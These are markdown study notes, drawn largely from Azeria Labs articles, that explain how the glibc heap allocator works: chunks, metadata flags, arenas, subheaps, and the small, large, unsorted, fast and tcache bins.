# Heap-Notes-and-Heap-Exploitation
##### Sources:
- https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/

- https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/
- https://azeria-labs.com/heap-exploit-development-part-1/

- https://homes.luddy.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf

- https://guyinatuxedo.github.io/25-heap/index.html#heap-exploitation

- https://www.inversecos.com/2022/06/how-to-reverse-engineer-and-patch-ios.html
- https://www.inversecos.com/2022/06/guide-to-reversing-and-exploiting-ios.html
- https://www.inversecos.com/2022/07/heap-overflows-on-ios-arm64-heap.html


--- 
#### What Is The Heap?
- Heap is a memory region allotted to every program. Unlike stack, heap memory can be dynamically allocated. 
	- This means that the program can 'request' and 'release' memory from the heap segment whenever it requires. 
		- Also, this memory is global, i.e. it can be accessed and modified from anywhere within a program and is not localized to the function where it is allocated. 
			- This is accomplished using 'pointers' to reference dynamically allocated memory which in turn leads to a small _degradation_ in performance as compared to using local variables (on the stack).

---

- The way the heap works is very platform and implementation specific; lots of different heap implementations exist. For example, Google Chrome’s [_PartitionAlloc_](https://chromium.googlesource.com/chromium/src/+/HEAD/base/allocator/partition_allocator/PartitionAlloc.md) is very different to the [_jemalloc_](https://github.com/jemalloc/jemalloc/wiki/Background) heap allocator used in FreeBSD. The default _glibc_ heap implementation in _Linux_ is also very different to how the heap works in _Windows_


- how heap allocations work for C/C++ programs running on _Linux_ devices by default.
	- This heap is derived from the [_ptmalloc_](http://www.malloc.de/en/) heap implementation, which is itself derived from the much older [_dlmalloc_](http://g.oswego.edu/dl/html/malloc.html) (Doug Lea malloc) memory allocator.

- First things first: What is the heap, and what is it for?
	- The _heap_ is used by C and C++ programmers to manually allocate new regions of process memory during program execution. Programmers ask the heap manager to allocate these regions of memory via calls to heap functions like [_malloc_](https://linux.die.net/man/3/malloc). These allocated regions of memory, or “allocations”, can then be used, modified or referenced by the programmer up until the programmer no longer needs it and returns the allocation back to the heap manager via a call to [_free_](https://linux.die.net/man/3/free).

- Here is an example of how a C program might allocate, use, and later free a structure on the heap:

```c
typedef struct 
{
    int field1;
    char field2;
} SomeStruct;

int main()
{
    SomeStruct* myObject = (SomeStruct*)malloc(sizeof(SomeStruct));
    **if**(myObject != NULL)
    {
        myObject->field1 = 1234;
        myObject->field2 = “Hello World!”;
        do_stuff(myObject);
	free(myObject);
    }
    return 0;
}
```

--- 

- The following graphic lists some basic rules that programmers must follow when using the heap, alongside some of the vulnerability categories that occur if the programmer violates these rules.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-rules-CS.png)


- Of course, _malloc_ and _free_ aren’t the only way C and C++ programmers interact with the heap. C++ developers often instead allocate memory via the C++ operator new & operator new[].
- https://en.cppreference.com/w/cpp/memory/new/operator_new
	-  When `new` operator is used, the variables/objects are considered to be pointers to the memory location allocated to them.
		- Allocates memory for the object on the free store or heap.
		-   Requires you to explicitly delete your object later using `delete` keyword. Not deleting it will cause memory leak.
		-   Memory stays allocated until you delete it.
##### using new
```cpp
void test() {
	int* a = new int;  	 //Requests memory to be allocated for variable a 
	int* b = new int(10); //Requests memory allocation and stores value 10 
	int* c = new int[10]; //Requests memory allocation for an array of size 10 
	delete a; 			 //Deletes memory allocated to a
	return 0;
}
```

- These allocations must be released using the corresponding C++ operators _delete_ and _delete[]_ rather than using _free_
- Programmers can also allocate memory via malloc-compatible heap functions like [_calloc_](http://man7.org/linux/man-pages/man3/calloc.3p.html), [_realloc_](http://man7.org/linux/man-pages/man3/realloc.3p.html) and [_memalign_](https://linux.die.net/man/3/memalign), which, like _malloc_, are eventually released via _free_.


- Here is an example of how a C++ program might allocate, use, and later free a structure on the heap:

```cpp
class SomeClass
{
public:
    int field1;
    char field2;
};

int main()
{
    SomeClass* myObject = new SomeClass();
    myObject->field1 = 1234;
    myObject->field2 = “Hello World!”;
    do_stuff(myObject);
    delete myObject;
    return 0;
}
```

---

#### Memory Chunks & The Chunck Allocation Strategies:

- Suppose a programmer asks for, say, 10 bytes of memory via _malloc_. To service this request, the heap manager needs to do more than just find a random 10 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation.
	- This metadata is stored alongside the 10-byte region that the programmer can use.

- The heap manager also needs to ensure that the allocation will be 8-byte aligned on 32-bit systems, or 16-byte aligned on 64-bit systems.
	- Alignment of allocations doesn’t matter if the programmer just wants to store some data like a text string or a byte array.

- but alignment can have a big impact on the correctness and performance of programs if the programmer intends to use the allocation to store more complex data structures. Since _malloc_ has no way to know what the programmer will store in their allocation, the heap manager must default to making sure all allocations are aligned.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/chunk-allocated-simple-CS.png)
- This allocation metadata and alignment-padding bytes is stored alongside the region of memory that _malloc_ will give back to the programmer. For this reason, the heap manager internally allocates “chunks” of memory that are slightly bigger than the programmer initially asked for. When the programmer asks for 10 bytes of memory, the heap manager finds or creates a new chunk of memory that is big enough to store the 10-byte space plus the metadata and alignment padding bytes. The heap manager then marks this chunk as “allocated”, and returns a pointer to the aligned 10-byte “user data” region inside the chunk, which the programmer sees as the return value of the _malloc_ call.


--- 

#### Chunk Allocation Basic Strategy:

- The simplified chunk-allocation strategy for small chunks is this:
	
	1. If there is a previously-freed chunk of memory, and that chunk is big enough to service the request, the heap manager will use that freed chunk for the new allocation.
	2. Otherwise, if there is available space at the top of the heap, the heap manager will allocate a new chunk out of that available space and use that.
	3. Otherwise, the heap manager will ask the kernel to add new memory to the end of the heap, and then allocates a new chunk from this newly allocated space.
	4. If all these strategies fail, the allocation can’t be serviced, and _malloc_ returns NULL.

ALLOCATING FROM FREE’D CHUNKS

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/bins-simple.png)

- Conceptually, allocating a previously-freed chunk is very simple. As memory gets passed back to _free_, the heap manager tracks these freed chunks in a series of different linked lists called “bins”. When an allocation request is made, the heap manager searches those bins for a free chunk that’s big enough to service the request. If it finds one, it can remove that chunk from the bin, mark it as “allocated”, and then return a pointer to the ``“user data”`` region of that chunk to the programmer as the return value of _malloc_.

- For performance reasons, there are several different types of bins, i.e. fast bins, the unsorted bin, small bins, large bins, and the per-thread tcache. I’ll discuss these different types of bins in more detail in the next part of this series.

---

#### Allocating From The Top Of The Heap

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-chunks-top.gif)


- If there are no free chunks available that can service the allocation request, the heap manager must instead construct a new chunk from scratch. To do this, the heap manager first looks at the free space at the end of the heap (sometimes called the “top chunk” or “remainder chunk”) to see if there is enough space there. If there is, the heap manager manufactures a new chunk out of this free space.


---

#### Asking The Kernel For More Memory At The Top of The Heap

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/process-memory-heap-gif-1.gif)

- Once the free space at the top of the heap is used up, the heap manager will have to ask the kernel to add more memory to the end of the heap.

- On the initial heap, the heap manager asks the kernel to allocate more memory at the end of the heap by calling [_sbrk_](http://man7.org/linux/man-pages/man2/sbrk.2.html). On most Linux-based systems this function internally uses a system call called “[brk](https://linux.die.net/man/2/brk)”. This system call has a pretty confusing name–it originally meant “change the program break location”, which is a complicated way of saying it adds more memory to the region just after where the program gets loaded into memory. Since this is where the heap manager creates the initial heap, the effect of this system call is to allocate more memory at the end of the program’s initial heap.

- Eventually, expanding the heap with _sbrk_ will fail–the heap will eventually grow so large that expanding it further would cause it to collide with other things in the process’ address space, such as memory mappings, shared libraries, or a thread’s stack region. Once the heap reaches this point, the heap manager will [resort to attaching](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l2320) new non-contiguous memory to the initial program heap using calls to [_mmap_](http://man7.org/linux/man-pages/man2/mmap.2.html).

- If _mmap_ also fails, then the process simply can’t allocate any more memory, and _malloc_ returns NULL.

--- 

#### Off-Heap Allocations via Mmap()

- Very large allocation requests* [get special treatment](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l866) in the heap manager. These large chunks are allocated off-heap using a direct call to _mmap_, and this fact is marked using a flag in the chunk metadata. When these huge allocations are later returned to the heap manager via a call to _free_, the heap manager releases the entire _mmap_ed region back to the system via _munmap_.

- ***By default [this threshold is](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l858) 128KB up to 512KB on 32-bit systems and 32MB on 64-bit systems, however this threshold [can also dynamically increase](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l949) if the heap manager detects that these large allocations are being used transiently.**

---

#### Arena's

- On multithreaded applications, the heap manager needs to defend internal heap data structures from race conditions that could cause the program to crash. Prior to _ptmalloc2_, the heap manager did this by simply using a global mutex before every heap operation to ensure that only one thread could interact with the heap at any given time.


- Although this strategy works, the heap allocator is so high-usage and performance sensitive that this led to significant performance problems on applications that use lots of threads. In response to this, the _ptmalloc2_ heap allocator introduced the concept of “arenas”. Each arena is essentially an entirely different heap that manages its own chunk allocation and free bins completely separately. Each arena still serializes access to its own internal data structures with a mutex, but threads can safely perform heap operations without stalling each other so long as they are interacting with different arenas.

- The initial (“main”) arena of the program only contains the heap we’ve already seen, and for single-threaded applications this is the only arena that the heap manager will ever use. However, as new threads join the process, the heap manager allocates and attaches secondary arenas to each new thread in an attempt to reduce the chance that the thread will have to wait around waiting for other thread when it attempts to perform heap operations like _malloc_ and _free_.

- With each new thread that joins the process, the heap manager tries to find an arena that no other thread is using and attaches the arena to that thread. Once all available arenas are in use by other threads, the heap manager [creates a new one](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l872), [up to the maximum](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1780) number of arenas of 2x _cpu-cores_ in 32-bit processes and 8x _cpu-cores_ in 64-bit processes. Once that limit is finally reached, the heap manager gives up and multiple threads will have to share an arena and run the risk that performing heap operations will require one of those threads to wait for the other.

- But wait a minute! How do these secondary arenas even work? Before we saw that the main heap is located just after where the program is loaded into memory and is expanded using the _brk_ system call, but this can’t also be true for secondary arenas!

- The answer is that these secondary arenas emulate the behavior of the main heap using one or more “[subheaps](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452)” created using _mmap_ and _mprotect_.

---
#### Subheaps

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-arenas-0-CS.png)


- Sub-heaps work mostly the same way as the initial program heap, with two main differences. Recall that the initial heap is located immediately after where the program is loaded into memory, and is dynamically expanded by _sbrk_. By contrast, each subheap is positioned into memory using _mmap_, and the heap manager manually emulates growing the subheap using _mprotect_.

- When the heap manager wants to create a subheap, it first asks the kernel to reserve a region of memory that the subheap can grow into by calling _mmap*__._ Reserving this region does not directly allocate memory into the subheap; it just asks the kernel to refrain from allocating things like thread stacks, mmap regions and other allocations inside this region.

- *By default, the maximum size of a subheap–and therefore the region of memory reserved for the subheap to grow into–is 1MB on 32-bit processes and 64MB on 64-bit systems.

- This is done by asking _mmap_ for pages that are marked _PROT_NONE_, which acts as a hint to the kernel that it only needs to reserve the address range for the region; it doesn’t yet need the kernel to attach memory to it.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-arenas-CS.png)

- Where the initial heap grew using _sbrk_, the heap manager emulates “growing” the subheap into this reserved address range by manually invoking [_mprotect_](http://man7.org/linux/man-pages/man2/mprotect.2.html) to change pages in the region from PROT_NONE to PROT_READ | PROT_WRITE. This causes the kernel to attach physical memory to those addresses, in effect causing the subheap to slowly grow until the whole _mmap_ region is full. Once the entire subheap is exhausted, the arena just allocates another subheap. This allows the secondary arenas to keep growing almost indefinitely, only eventually failing when the kernel runs out of memory, or when the process runs out of address space.

- To recap: the initial (“main”) arena contains only the main heap which lives just after the where the program binary is loaded into memory, and is expanded using _sbrk_. This is the only arena that is used for single-threaded applications. On multithreaded applications, new threads are given secondary arenas from which to allocate. Using arenas speeds up the program by reducing the likelihood that a thread will need to wait on a mutex before being able to perform a heap operation. Unlike the main arena, these secondary arenas allocate chunks from one or more _subheaps_, whose location in memory is first established using _mmap_, and which grow by using _mprotect_.

---

#### Chunk Metadata

- Now we finally know all of the different ways that a chunk might get allocated, and that chunks contain not only the “user data” area that will be given to the programmer as the return value of _malloc_, but also metadata. But what does this chunk metadata actually record, and where does it live?

- The [exact layout](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1038) of the chunk metadata in memory can be a bit confusing, because the heap manager source code combines metadata at the end of one chunk with the metadata at the start of the next, and several of the metadata fields exist or are used depending on various characteristics of the chunk.

- For now, we’ll just look at live allocations, which have a single _size_t*_ header that is positioned just behind the “user data” region given to the programmer. This field, which the source code calls _mchunk_size_, is written to during _malloc_, and later used by _free_ to decide how to handle the release of the allocation.

- *A size_t value is an 4 byte integer on a 32-bit system and an 8 byte integer on on a 64-bit system.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/chunk-allocated-CS.png)

- The _mchunk_size_ stores four pieces of information: the chunk size, and three bits called “A”, “M”, and “P”. These can all be stored in the same _size_t_ field because chunk sizes are always 8-byte aligned (or 16-byte aligned on 64-bit), and therefore the low three bits of the chunk size are always zero.

- The “A” flag is used to tell the heap manager if the chunk belongs to secondary arena, as opposed to the main arena. During free, the heap manager is only given a pointer to the allocation that the programmer wants to free, and the heap manager needs to work out which arena the pointer belongs to. If the A flag is set in the chunk’s metadata, the heap manager must search each arena and see if the pointer lives within any of that arena’s subheaps. If the flag is not set, the heap manager can short-circuit the search because it knows the chunk came from the initial arena.

- The “M” flag is used to indicate that the chunk is a huge allocation that was allocated off-heap via _mmap_. When this allocation is eventually passed back to _free_, the heap manager will return the whole chunk back to the operating system immediately via _munmap_ rather than attempting to recycle it. For this reason, freed chunks never have this flag set.

- The “P” flag is confusing because it really belongs to the _previous_ chunk. It indicates that the previous chunk is a _free_ chunk. This means when _this_ chunk is freed, it can be safely joined onto the previous chunk to create a much larger free chunk.

![al text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-chunks-coalescing-gif-color.gif)


---

#### Understanding The Glibc Heap Implemenentation

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/chunk-allocated-simple-CS.png)

- under-the-hood, _malloc_ handles memory allocation requests by allocating memory _chunks._ Each chunk not only stores the “user data” region returned by malloc that the programmer will interact with, but also metadata associated with that chunk.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/heap-chunks-top.gif)

- We saw how the heap manager’s basic chunk-allocation strategy works, and we saw how new chunks get created from the top of the heap when there are no already-freed chunks that can be recycled to service the request.

- I want to talk about how this chunk-recycling strategy works, i.e., how allocations passed back to _free_ get saved and eventually recycled to service future _malloc_ requests. Lots of heap exploitation techniques rely on exploiting these internal mechanics, but for now, let’s just look at how these chunks get recycled by _free_ when the heap is operating correctly.

---

#### How does free() work?

- When a programmer is finished with an allocation from _malloc_ (or a malloc-compatible allocation like _calloc_), the programmer releases it back to the heap manager by passing it to [_free_](https://linux.die.net/man/3/free). The [C standard](http://www.open-std.org/JTC1/SC22/wg14/www/docs/n1124.pdf) defines _free(NULL)_ to do nothing, but for all other calls to free, the heap manager’s first job is to resolve the pointer back to its corresponding chunk. The heap manager does this by [subtracting the size of the chunk metadata from the pointer](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1172) that was passed to free.

- This conversion from pointer to chunk works because the user data region lies inside the chunk, but it is, of course, only valid if the pointer passed to free really is from a live allocation from _malloc_.`If some other pointer were passed to free, the heap manager might release or recycle an invalid chunk leading to memory corruption problems` that could cause the process to crash or potentially even let hackers remotely takeover the process.

- For this reason, _free_ first does a couple of basic sanity checks to see if the freed pointer is obviously invalid before attempting to process it. If any of the checks fail, the program aborts. The checks include:

	1.  A check that the allocation [is aligned](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4182) on an 8-byte (or 16-byte on 64-bit) boundary, since _malloc_ ensures all allocations are aligned.
	2.  A check that the chunk’s size field isn’t impossible–either because it is [too small](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4318), too large, not an aligned size, or [would overlap the end of the process’ address space](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4175).
	3.  A check the chunk lies [within the boundaries of the arena](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4318).
	4.  A check that the chunk is [not already marked as free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4182) by checking the corresponding “P” bit that lies in the metadata at the start of the next chunk.

- The heap manager’s checks here are not exhaustive; `a pointer to data an attacker controls could potentially bypass these sanity checks and still trigger memory corruption in the process`.

---

#### Free Chunk Metadata

- I also showed how live chunks store metadata alongside the “user data” region used by the programmer. These live allocations store the “chunk size”, and three bits called “A”, “M” and “P” in their metadata. Those bits help the heap manager remember if the chunk was allocated from the non-main arena, was allocated off-heap via _mmap_, and whether the previous chunk is free respectively.

- Free chunks store metadata too. Like live allocations, they store the “chunk size”, “A”, and “P” fields, but they do not use the “M” field, since an [mmap](http://man7.org/linux/man-pages/man2/mmap.2.html)-ed chunk will always be [_munmap-_](https://linux.die.net/man/3/munmap)ed during _free_ rather than turned into a free chunk for recycling.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/chunk-freed-CS.png)


- Free chunks also store information _after_ the user data region using a technique called “[boundary tags](http://g.oswego.edu/dl/html/malloc.html)”. These boundary tags carry size information before and after the chunk. This allows chunks to be traversed starting from any known chunk and in any direction, and thereby enable very fast coalescing of adjacent free chunks.

- These freed chunks are stored in corresponding “free bins” that operate as [linked lists](https://en.wikipedia.org/wiki/Linked_list). This requires each free chunk to also store pointers to other chunks. Since the “user data” in the freed chunk is (by definition) free for use by the heap manager, the heap manager repurposes this “user data” region in freed chunks as the place where this additional metadata lives.
---

#### Recycling Memory With Bins

- To improve performance, the heap manager instead maintains a series of lists called “bins”, which are designed to maximize speed of allocations and frees.

- There are 5 type of bins: [62](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1407) **small bins,** 63 **large bins,** 1 **unsorted bin,** 10 **fast bins** and 64 **tcache bins** per thread.

- The small, large, and unsorted bins are the oldest type of bin and are used to implement what I’ll refer to here as the _basic_ recycling strategy of the heap. The `fast bins` and `tcache bins` are optimizations that layer on top of these.

- Confusingly, the small, large, and unsorted bins all [live together in the same array](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1686) in the heap manager’s source code. Index 0 is unused, 1 is the unsorted bin, bins 2-64 are small bins and bins 65-127 are large bins.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/05/bins-new.png.pagespeed.ce.1uJk6oyDtu.png "bins-new")

---

#### CHUNK RECYCLING: THE BASIC STRATEGY

- Before getting to _tcache_ and _fastbin_ optimizations, let’s first look at the basic recycling strategy used by the heap manager.

- Recall, the basic algorithm for _free_ is as follows:

	1.  If the chunk has the _M_ bit set in the metadata, the allocation was allocated off-heap and should be [_munmap_](https://linux.die.net/man/3/munmap)'ed.
	2.  Otherwise, if the chunk _before_ this one is free, the chunk is merged backwards to create a bigger free chunk.
	3.  Similarly, if the chunk _after_ this one is free, the chunk is merged forwards to create a bigger free chunk.
	4.  If this potentially-larger chunk borders the “top” of the heap, the whole chunk is absorbed into the end of the heap, rather than stored in a “bin”.
	5.  Otherwise, the chunk is marked as free and placed in an appropriate bin.

---

#### Small Bins

- Small bins are the easiest basic bin to understand. There are 62 of them, and each small bin stores chunks that are all the same fixed size. Every chunk less than 512 bytes on 32-bit systems (or than 1024 bytes on 64-bit systems) has a corresponding small bin. Since each small bin stores only one size of chunk, they are automatically ordered, so insertion and removal of entries on these lists is incredibly fast.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/bins-small.png.pagespeed.ce.hyNIbbaoGL.png)

---

#### Large Bins

- The strategy for small bins is great for small allocations, but we can’t have a bin for every possible chunk size. For chunks over 512 bytes (1024 bytes on 64-bit), the heap manager instead uses “large bins”.

- Each of the 63 “large bins” operates mostly the same way as small bins, but instead of storing chunks with a fixed size, they instead store chunks within a size range. Each large bin’s size range is designed to not overlap with either the chunk sizes of small bins or the ranges of other large bins. In other words, given a chunk’s size, there is exactly one small bin or large bin that this size corresponds to.

- Because large bins store a range of sizes, insertions onto the bin have to be manually sorted, and allocations from the list require traversing the list. This makes large bins inherently slower than their small bin equivalents. Large bins are, however, used less frequently during most programs. This is because programs tend to allocate (and thus release) small allocations at a far higher rate than large allocations on average. For the same reason, “large bin” ranges are clustered towards smaller chunk sizes; the smallest “large bin” covers only the 64-byte range from 512 bytes to 576 bytes, whereas the second largest covers a size range of 256KB. The largest of the large bins covers all freed chunks [above 1MB](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1394)

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/bins-large.png.pagespeed.ce.ub5yRD4tiF.png)

---

#### Unsorted Bin

- The heap manager improves this basic algorithm one step further using an optimizing cache layer called the “unsorted bin”. This optimization is based on the observation that often frees are clustered together, and frees are often immediately followed by allocations of similarly sized chunks. For example, a program releasing a tree or a list will often release many allocations for every entry all at once, and a program updating an entry in a list might release the previous entry before allocating space for its replacement.

- In these cases, merges of these freed chunks before putting the resulting larger chunk away in the correct bin would avoid some overhead, and being able to fast-return a recently freed allocation would similarly speed up the whole process.

- The heap manager introduces the _unsorted bin_ to take advantage of these observations. Instead of immediately putting newly freed chunks onto the correct bin, the heap manager coalesces it with neighbors, and dumps it onto a general _unsorted_ linked list. During _malloc_, each item on the unsorted bin is checked to see if it “fits” the request. If it does, _malloc_ can use it immediately. If it does not, malloc then puts the chunk into its corresponding small or large bin.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/bins-unsorted.png)

---

#### Fast Bins

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/bins-fast.png.pagespeed.ce.5ckjeMVyfU.png)

- Fast bins are a further optimization layered on top of the three basic bins we’ve already seen. These bins essentially keep recently released small chunks on a “fast-turnaround queue”, intentionally keeping the chunk live and not merging the chunk with its neighbors so that it can be immediately repurposed if a malloc request for that chunk size comes in very soon after the chunk is freed.

- Like small bins, each fast bin is responsible only for a single fixed chunk size. There are 10 such fast bins, covering chunks of size 16, 24, 32, 40, 48, 56, 64, 72, 80, and 88 bytes plus chunk metadata.

- Unlike their small bin cousins, fast bins chunks are never merged with their neighbors. In practice, the way this works is the heap manager doesn’t set the “P” bit at the start of the next chunk. If you like, you can think of this conceptually as the heap manager not “truly” freeing the chunk in the fast-bins.

- Like their small bin counterparts, fast bins covers only a single chunk size, are thus automatically sorted, and so insertions and removals are incredibly fast. Moreover, since fast-binned chunks are never merge candidates, they [can also be stored in singly-linked lists](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1678), rather than needing to be on doubly linked lists so that they can be removed from a list if the chunk gets merged.

- The downside of fastbins, of course, is that fastbin chunks are not “truly” freed or merged, and this would eventually cause the memory of the process to fragment and balloon over time. To resolve this, heap manager periodically “[consolidates](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4448)” the heap. This “flushes” each entry in the fast bin by “actually freeing” it, i.e., merging it with adjacent free chunks, and placing the resulting free chunks onto the unsorted bin for malloc to later use.

- This “consolidation” stage occurs whenever a _malloc_ request is made that is larger than a _fastbin_ can service (i.e., for chunks [over 512 bytes](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l3696) or 1024 bytes on 64-bit), when [freeing any chunk over 64KB](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1592) (where 64KB is a heuristically chosen value), or when [malloc_trim](http://man7.org/linux/man-pages/man3/mallopt.3.html) or [mallopt](http://man7.org/linux/man-pages/man3/mallopt.3.html) are called by the program.

--- 

#### TCache (PER-THREAD CACHE) Bins

- The final optimization used by the heap manager to speed up allocations is the per-thread cache, or “_tcache”_ allocator. But first let’s look at the problem the tcache is trying to solve.

- Each process on a given computer system has one or more threads running at the same time. Having multiple threads allows a process to execute multiple concurrent operations. For example, a high-volume web-server might have multiple simultaneous incoming requests, and the web-server might service each incoming request on its own thread, rather than have each request wait in line to be serviced.

- Each thread in a given process shares the same address space, which is to say, each thread can see the same code and data in memory. Each thread gets its own registers and stack to store temporary local variables, but resources like global variables and the heap are shared between all of the threads.

![alt text](https://azeria-labs.com/wp-content/uploads/2019/03/threads.png.pagespeed.ce.VaB3XNJZyR.png)

- Coordinating access to global resources like the heap is a complicated topic, and getting it wrong can lead to a problem known as “_race conditions”_, which cause hard-to-debug crashes which are often also exploitable by hackers.

- In our example of a website, suppose a web-request being serviced on one thread tries to update a database row, and another concurrent web-request tries to read from that same row. Normally, we’ll want to make sure the second thread never sees the row mid-write as it’s being overwritten by another thread and thus seeing the row in some partial or corrupted form. Databases solve this problem by making reads and writes appear to operate _atomically_: if two threads try to access the same row at the same time, one operation must complete before the next can begin. `A very common way of solving these race-conditions is to force otherwise-simultaneous requests accessing a global resource into a sequential queue by using locks.`


- In general, locks work by one thread “marking” that it has taken ownership of a global resource before using it, then doing its operation, then marking that the resource is no longer in use. If another thread comes along and wants to use the resource and sees some other thread is using it, the thread waits until the other thread is done. This ensures that the global resource is only used by one thread at a time. But it comes with a cost: the thread that is waiting on the resource is stalling and wasting time. This is called “_lock contention_”.

- For many global variables, this is an acceptable cost. But for the heap which is constantly in use by all threads, this cost quickly translates into the whole program slowing down.

- The heap manager mostly solves this problem by using per-thread arenas where each thread gets its own arena until it hits the threshold. Additionally, the _tcache_ per-thread cache is designed to reduce the cost of the lock itself because the lock instructions are quite expensive and end up taking a significant portion of the execution time in the fast path. This feature was [added to the malloc memory allocation function in glibc 2.26](https://www.phoronix.com/scan.php?page=news_item&px=glibc-malloc-thread-cache) and is enabled by default.

- Per-thread caching speeds up allocations by having per-thread bins of small chunks ready-to-go. That way, when a thread requests a chunk, if the thread has a chunk available on its tcache, it can service the allocation without ever needing to wait on a heap lock.

- By default, each thread has 64 singly-linked tcache bins. Each bin contains a maximum of [7 same-size chunks](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l323) ranging from [24 to 1032 bytes on 64-bit systems and 12 to 516 bytes on 32-bit systems](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l315).

--- 

#### How Do Chunks End Up In Tcache Bins???

- When a chunk is free'd, the heap manager sees if the chunk will fit into a _tcache_ bin corresponding to the chunk size. Like the fast-bin, chunks on the _tcache_ bin are considered “in use”, and won’t be merged with neighboring free'd chunks.
   If the _tcache_ for that chunk size is full (or the chunk is too big for a _tcache_ bin), the heap manager reverts to our old slow-path strategy of obtaining the heap lock and then processing the chunk as before.

- Corresponding _tcache_ allocations are also pretty straightforward. Given a request for a chunk if a chunk is available on an appropriate _tcache_ bin, the heap returns that chunk without ever obtaining the heap lock. If the chunk is too big for the _tcache_, we also continue as before.

- In the case where we try and make an allocation, there is a corresponding _tcache_ bin, but that bin is full, we do a slightly-modified allocation strategy. Rather than just taking the heap lock and finding a _single_ chunk, we take the heap lock and [opportunistically promote as many chunks as possible at this size to the _tcache_](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3585) while we still hold the heap lock, up to the _tcache_ bin limit of seven, [and return the last matching chunk](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3778) back to the user.

---

